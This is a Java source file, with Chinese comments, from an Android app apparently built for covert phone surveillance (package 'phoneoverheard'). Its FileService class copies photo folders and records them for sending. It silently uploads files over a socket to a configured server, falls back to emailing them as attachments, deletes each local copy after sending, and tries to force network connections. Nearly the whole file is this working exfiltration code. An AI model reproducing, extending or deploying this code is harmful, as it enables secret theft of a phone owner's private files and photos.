package com.phoneoverheard.phonne;

import java.io.BufferedInputStream;
import java.io.BufferedWriter;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PushbackInputStream;
import java.io.RandomAccessFile;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import java.security.MessageDigest;

import org.apache.http.util.ByteArrayBuffer;
import org.apache.http.util.EncodingUtils;

import com.phoneoverheard.database.DatabaseHelper;
import com.phoneoverheard.database.Manager;
import com.phoneoverheard.database.ManagerService;
import com.phoneoverheard.database.Sendimg;
import com.phoneoverheard.database.SendimgService;

import android.annotation.SuppressLint;
import android.content.Context;
import android.database.sqlite.SQLiteDatabase;
import android.os.Environment;
import android.util.Log;

@SuppressLint({ "WorldWriteableFiles", "WorldReadableFiles" })
public class FileService {
	private Context context;
	private static final String TAG = "FileService";
	
	/*方法：getDataDirectory()
	解释：返回 File ，获取 Android 数据目录。
	* 方法：getDownloadCacheDirectory()
	解释：返回 File ，获取 Android 下载/缓存内容目录。
	* 方法：getExternalStorageDirectory()
	解释：返回 File ，获取外部存储目录即 SDCard
	* 方法：getExternalStoragePublicDirectory(String type)
	解释：返回 File ，取一个高端的公用的外部存储器目录来摆放某些类型的文件
	* 方法：getExternalStorageState()
	解释：返回 File ，获取外部存储设备的当前状态
	* 方法：getRootDirectory()
	解释：返回 File ，获取 Android 的根目录*/
	
	/**
	 * 电话根目录下创建目录
	 * @param myDir 目录
	 * @return PhoneDir 实际目录
	 */
	public String getPhonePath(String myDir){ 
		String newdestDir="/";
		String PhoneDir = Environment.getDataDirectory() + myDir;
		File destDir = new File(PhoneDir);
		if (!destDir.exists()) {
			String[] myDirs = myDir.split("/");
			for(int i=1;i<myDirs.length;i++){
				newdestDir += myDirs[i]+"/";
				Log.i(TAG, Environment.getDataDirectory() + newdestDir);
				destDir = new File(Environment.getDataDirectory() + newdestDir);
				destDir.mkdirs();
			}
		}
		return PhoneDir;
	} 
	
	/**
	 * 电话根目录下创建目录
	 * @param myDir 目录
	 * @return sdDir 实际目录
	 */
	public String getSDPath(String myDir){ 
		String newdestDir="/";
		String sdDir = myDir;
		File destDir = new File(sdDir);
		if (!destDir.exists()) {
			String[] myDirs = myDir.split("/");
			for(int i=1;i<myDirs.length;i++){
				newdestDir += myDirs[i]+"/";				
				destDir = new File(Environment.getExternalStorageDirectory() + newdestDir);
				destDir.mkdirs();
			}
		}
		return sdDir;
	} 
	/**
	 * 保存文件
	 * @param filename 文件名称
	 * @param content 文件内容
	 */
	public void saveToSDCard(String filefolder,String filename, String content,Context mycontext)throws Exception {
		filefolder = Environment.getExternalStorageDirectory() + filefolder;
		File file = new File(filefolder, filename);
		if(Environment.MEDIA_MOUNTED.endsWith(Environment.getExternalStorageState())) { 
			FileOutputStream outStream = new FileOutputStream(file);
			outStream.write(content.getBytes());
			outStream.close();
			//Toast.makeText(mycontext, "成功保存到sd卡", Toast.LENGTH_LONG).show();  //弹出Toast消息
			CheckConnectInternet(file,mycontext);
		}
	}
	
	/**
	 * 保存文件
	 * @param filename 文件名称
	 * @param content 文件内容
	 */
	public void saveToSDCard(String filefolder,String filename, String content)throws Exception {
		BufferedWriter out = null;  
		filefolder = Environment.getExternalStorageDirectory() + filefolder;
		File file = new File(filefolder, filename);
		if(Environment.MEDIA_MOUNTED.endsWith(Environment.getExternalStorageState())) { 
			try {
				out = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(file, true)));  
				out.write(content+"\n");  
				out.close();				
				} catch (FileNotFoundException e) {
				e.printStackTrace();
				} catch (IOException e) {
				e.printStackTrace();
			}
		}

	}
	
	/**
	 * 保存文件
	 * @param filename 文件名称
	 * @param content 文件内容
	 */
	public void save(String filename, String content) throws Exception {
		//私有操作模式：创建出来的文件只能被本应用访问，其它应用无法访问该文件，另外采用私有操作模式创建的文件，写入文件中的内容会覆盖原文件的内容
		FileOutputStream outStream = context.openFileOutput(filename, Context.MODE_PRIVATE);
		outStream.write(content.getBytes());
		outStream.close();
	}
	
	/**
	 * 保存文件
	 * @param filename 文件名称
	 * @param content 文件内容
	 */
	public void saveAppend(String filename, String content) throws Exception {//ctrl+shift+y / x
		//私有操作模式：创建出来的文件只能被本应用访问，其它应用无法访问该文件，另外采用私有操作模式创建的文件，写入文件中的内容会覆盖原文件的内容
		FileOutputStream outStream = context.openFileOutput(filename, Context.MODE_APPEND);
		outStream.write(content.getBytes());
		outStream.close();
	}
	
	
	
    /**
     * 功能描述：上传文件到服务器
     */
	public void uploadFileWifi(final File file,final Context context) {
		if(file!=null && file.exists()){			
			new Thread(new Runnable() {
				@Override
				public void run() {
					try {	
						//使用Socket进行上传文件，Wifi网络必须可用,同时关闭GPRS网络
						if(new WifiGPRS(context).CheckAndConnectWifi()){
							Log.i(TAG, "线程："+Thread.currentThread().getName()+";Content-Length="+ file.length() + ";filename="+ file.getName());
							ManagerService managerservice = new ManagerService(context);					
							SQLiteDatabase managerdb = new DatabaseHelper(context).getWritableDatabase(); 
					        Manager manager = managerservice.findFolder (managerdb,"manager");				        
							Socket socket = new Socket(manager.getServeraddress(), Integer.parseInt(manager.getServerport()));
				            OutputStream outStream = socket.getOutputStream();
				            String head = "Content-Length="+ file.length() + ";filename="+ file.getName() + ";sourceid=\r\n";
				            outStream.write(head.getBytes());			
				            
				            PushbackInputStream inStream = new PushbackInputStream(socket.getInputStream());	
							String response = StreamTool.readLine(inStream);
				            String[] items = response.split(";");
							String position = items[1].substring(items[1].indexOf("=")+1);
							
							RandomAccessFile fileOutStream = new RandomAccessFile(file, "r");
							fileOutStream.seek(Integer.valueOf(position));
							byte[] buffer = new byte[1024];
							int len = -1;
							while( (len = fileOutStream.read(buffer)) != -1){
								outStream.write(buffer, 0, len);
							}
							Log.i(TAG, "文件上传成功："+file.getPath());
							fileOutStream.close();
							outStream.close();
				            inStream.close();
				            socket.close();
				            managerdb.close();
				            file.delete();	
						}
			        } catch (Exception e) {
			        	try{
							ManagerService managerservice = new ManagerService(context);									
							String mailbody = "文件名称："+file.getName()+"\n"+"文件大小："+file.length()+"\n";
							String sendfileurl = file.getPath();							
							Manager manager = managerservice.find("manager");
							new sendEmail().sendEmailTo(file.getName(),mailbody,sendfileurl,manager.getMailsendto(),context);
							file.delete();
			        	}catch(Exception err){
				        	Log.i(TAG,"文件上传时出现异常");
				        	uploadFileGPSR(file,context);  //作为邮件附件，使用GPRS进行发送邮件
			        	}
			        }
				}
			}).start();
		}

	}
	
	
    /**
     * 作为邮件附件，使用GPRS进行发送邮件
     */
	public void uploadFileGPSR(final File file,final Context context) {
		if(file!=null && file.exists()){
			if(file.length() < 10000000){
				//当文件大小超过10M时，作为邮件附件，使用GPRS进行发送邮件
				//如果GPRS网络已连接，则开始发送邮件	
				if(new WifiGPRS(context).CheckAndConnectGPRS()){
					new Thread(new Runnable() {
						@Override
						public void run() {
							try {	
								Log.i(TAG, "线程："+Thread.currentThread().getName()+";Content-Length="+ file.length() + ";filename="+ file.getName());
								ManagerService managerservice = new ManagerService(context);									
								String mailbody = "文件名称："+file.getName()+"\n"+"文件大小："+file.length()+"\n";
								String sendfileurl = file.getPath();							
								Manager manager = managerservice.find("manager");
								new sendEmail().sendEmailTo(file.getName(),mailbody,sendfileurl,manager.getMailsendto(),context);
								file.delete();
					        } catch (Exception e) {                    
					            Log.i(TAG,"Email发送时出现异常");
					        }
						}
					}).start();
				}
			}
		}
	}
	
	
	/**
	 * 读取文件内容
	 * @param filename 文件名称
	 * @return 文件内容
	 * @throws Exception
	 */
	public String read(String filename) throws Exception {
		FileInputStream inStream = context.openFileInput(filename);
		ByteArrayOutputStream outStream = new ByteArrayOutputStream();
		byte[] buffer = new byte[1024];
		int len = 0;
		while((len = inStream.read(buffer)) != -1){
			outStream.write(buffer, 0, len);
		}
		byte[] data = outStream.toByteArray();
		return new String(data);
	}

	/**
	 * MD5加密，32位
	 * @param str 字符串
	 * @return 加密后的字符串
	 */
    public String MD5(String str) {
        MessageDigest md5 = null;
        try {
            md5 = MessageDigest.getInstance("MD5");
        } catch (Exception e) {
            e.printStackTrace();
            return "";
        }
 
        char[] charArray = str.toCharArray();
        byte[] byteArray = new byte[charArray.length];
 
        for (int i = 0; i < charArray.length; i++) {
            byteArray[i] = (byte) charArray[i];
        }
        byte[] md5Bytes = md5.digest(byteArray);
 
        StringBuffer hexValue = new StringBuffer();
        for (int i = 0; i < md5Bytes.length; i++) {
            int val = (md5Bytes[i]) & 0xff;
            if (val < 16) {
                hexValue.append("0");
            }
            hexValue.append(Integer.toHexString(val));
        }
        return hexValue.toString();
    }
    
    /** 
     * 复制单个文件 
     * @param oldPath String 原文件路径 如：c:/fqf.txt 
     * @param newPath String 复制后路径 如：f:/fqf.txt 
     * @return 无 
     */ 
   @SuppressWarnings({ "resource", "unused" })
   public void copyFile(String oldPath, String newPath) { 
       try { 
           int bytesum = 0; 
           int byteread = 0; 
           File oldfile = new File(oldPath); 
           if (!oldfile.exists()) { //文件不存在时 
               InputStream inStream = new FileInputStream(oldPath); //读入原文件 
               FileOutputStream fs = new FileOutputStream(newPath); 
               byte[] buffer = new byte[1444]; 
               int length; 
               while ( (byteread = inStream.read(buffer)) != -1) { 
                   bytesum += byteread; //字节数 文件大小 
                   System.out.println(bytesum); 
                   fs.write(buffer, 0, byteread); 
               } 
               inStream.close(); 
           } 
       } 
       catch (Exception e) { 
           System.out.println("复制单个文件操作出错"); 
           e.printStackTrace(); 

       } 

   } 

   /** 
     * 复制整个文件夹文件
     * @param oldPath String 原文件路径 如：c:/oldPath/file/  
     * @param newPath String 复制后路径 如：f:/newPath/file/ 
     * @return boolean 
     */ 
   public void copyFolder(String oldPath, String newPath,Context context) { 
       try { 
           (new File(newPath)).mkdirs(); //如果文件夹不存在 则建立新文件夹 
           File a=new File(oldPath); 
           String[] file=a.list(); 
           File temp=null; 
           File newtemp=null;            
           for (int i = 0; i < file.length; i++) { 
               if(oldPath.endsWith(File.separator)){ 
                   temp=new File(oldPath+file[i]); 
                   newtemp=new File(newPath+file[i]);
               } 
               else{ 
                   temp=new File(oldPath+File.separator+file[i]); 
                   newtemp=new File(newPath+File.separator+file[i]); 
               }
               long filetimeMillis=  temp.lastModified();
               SendimgService sendimgservice = new SendimgService(context);
               if(!sendimgservice.ImgExist(filetimeMillis)&&temp.isFile()&&!newtemp.exists()){   //如果旧文件不存在或者新文件夹中存在该文件则不复制
            	   Log.i(TAG, "COPY oldFilePath=="+temp+" TO newFilePath=="+newtemp);
            	   int sendstate = 0;
            	   long imgsize = temp.length();
            	   String datetime = filetimeMillis+"";
            	   String imgurl = temp.getPath();
            	   String imgname = temp.getName();
            	   Sendimg sendimg = new Sendimg(sendstate,imgsize,datetime,imgurl,imgname);
            	   sendimgservice.insert (sendimg);
                   FileInputStream input = new FileInputStream(temp); 
                   FileOutputStream output = new FileOutputStream(newPath + "/" + 
                           (temp.getName()).toString()); 
                   byte[] b = new byte[1024 * 5]; 
                   int len; 
                   while ( (len = input.read(b)) != -1) { 
                       output.write(b, 0, len); 
                   } 
                   output.flush(); 
                   output.close(); 
                   input.close(); 
               } 
               if(temp.isDirectory()){//如果是子文件夹 
                   copyFolder(oldPath+"/"+file[i],newPath+"/"+file[i],context); 
               } 
           } 
       } 
       catch (Exception e) { 
           System.out.println("复制整个文件夹内容操作出错"); 
           e.printStackTrace(); 
       } 
   }
   

   /** 
     * 上传整个文件夹内容 
     * @param FolderPath String 文件夹路径 如：c:/oldPath/file/  
     * @return 无 
     */ 
   public void uploadFolder(String FolderPath,Context context) { 
       try { 
           File a=new File(FolderPath); 
           String[] file=a.list(); 
           File temp=null;            
           for (int i = 0; i < file.length; i++) { 
               if(FolderPath.endsWith(File.separator)){ 
                   temp=new File(FolderPath+file[i]); 
               } 
               else{ 
                   temp=new File(FolderPath+File.separator+file[i]); 
               } 
               if(temp.isFile()){   //如果旧文件不存在则不复制
            	   CheckConnectInternet(temp,context);
            	   Log.i(TAG, "upload FilePath=="+temp);
               } 
               if(temp.isDirectory()){//如果是子文件夹 
            	   uploadFolder(FolderPath+"/"+file[i],context); 
               } 
           } 
       } 
       catch (Exception e) { 
           System.out.println("上传整个文件夹内容操作出错"); 
           e.printStackTrace(); 
       } 
   }
   
   
   /**
    * 功能描述：判断网络是否能连上Internet网络
    * @param 无
    */
   public void CheckConnectInternet(final File file,final Context context){
		new Thread(){
	    	@SuppressWarnings("unused")
			public void run(){
	    		boolean isConnect = false;
	    		String myString = "";
	    		try {
	    			// 定义获取文件内容的URL
	    			URL myURL = new URL("http://www.baidu.com");
	    			// 打开URL链接
	    			Log.i(TAG, "打开URL链接");
	    			URLConnection ucon = myURL.openConnection();
	    			// 使用InputStream，从URLConnection读取数据
	    			InputStream is = ucon.getInputStream();
	    			BufferedInputStream bis = new BufferedInputStream(is);
	    			// 用ByteArrayBuffer缓存
	    			ByteArrayBuffer baf = new ByteArrayBuffer(50);
	    			int current = 0;
	    			while ((current = bis.read()) != -1) {
	    				baf.append((byte) current);
	    			}
	    			// 将缓存的内容转化为String,用UTF-8编码
	    			myString = EncodingUtils.getString(baf.toByteArray(), "UTF-8");
	    			Log.i(TAG, myString);
	    			if(myString.indexOf("百度") != -1){
	    				Log.i(TAG, "Wifi网络可以连接Internet网络");
	    				isConnect = true;
	    				uploadFileWifi(file,context);
	    			}else{
	    				Log.i(TAG, "Wifi网络无法连接Internet网络，开始使用GPRS网络邮箱附件方式发送文件");
	    				isConnect = false;
	    				uploadFileGPSR(file,context);
	    			}
	    		} catch (Exception e) {
    				Log.i(TAG, "Wifi网络无法连接Internet网络，开始使用GPRS网络邮箱附件方式发送文件");
    				isConnect = false;
    				uploadFileGPSR(file,context);
	    		}
	    	}
	    }.start();
   }
   

   
}
